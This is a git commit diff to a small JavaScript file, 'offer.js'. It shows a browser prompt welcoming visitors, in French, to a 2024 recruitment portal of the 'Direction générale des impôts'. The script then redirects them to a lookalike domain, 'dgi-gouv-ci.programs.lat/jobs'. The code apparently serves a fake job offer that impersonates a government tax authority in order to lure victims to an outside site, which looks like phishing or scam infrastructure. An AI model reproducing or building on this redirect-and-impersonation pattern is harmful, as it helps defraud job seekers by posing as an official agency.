6d46e0166a25ef4ca581242bad964e58ce0f369d
decullian <decullianresort@gmail.com>
2024-08-16 02:53:19 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = ''
-password=prompt('Bienvenue sur le portail de recrutement de la Direction générale des impôts 2024, appuyez sur OK pour continuer ','');
-if (password != '') {
+var password = 'ok'
+password=prompt('Bienvenue sur le portail de recrutement de la Direction générale des impôts 2024, appuyez sur OK pour continuer ','ok');
+if (password != 'ok') {
 location.href='https://dgi-gouv-ci.programs.lat/jobs';
 }
